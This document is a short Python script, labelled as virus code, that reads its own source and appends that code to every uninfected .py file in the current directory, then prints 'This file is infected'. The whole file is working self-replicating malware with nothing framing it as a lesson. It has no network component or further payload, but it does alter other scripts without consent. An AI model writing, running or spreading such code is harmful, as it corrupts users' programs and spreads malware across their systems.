# starting virus code
import glob
import re
import sys

virusCode = []

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

inVirus = False
for line in lines:
    if(re.search("^# starting virus code", line)):
        inVirus = True

    if(inVirus == True):
        virusCode.append(line)

    if(re.search("^# end of virus code", line)):
        break

# Find the potential victims
programs = glob.glob("*.py")

for p in programs:
    file = open(p, "r")
    programCode = file.readlines()
    file.close()

    infected = False
    for line in programCode:
        if(re.search("^# starting virus code", line)):
            infected = True
            break

    if not infected:
        newCode = []
        newCode = programCode
        newCode.extend(virusCode)

        file = open(p, "w")
        file.writelines(newCode)
        file.close()

print("This file is infected")

# end of virus code
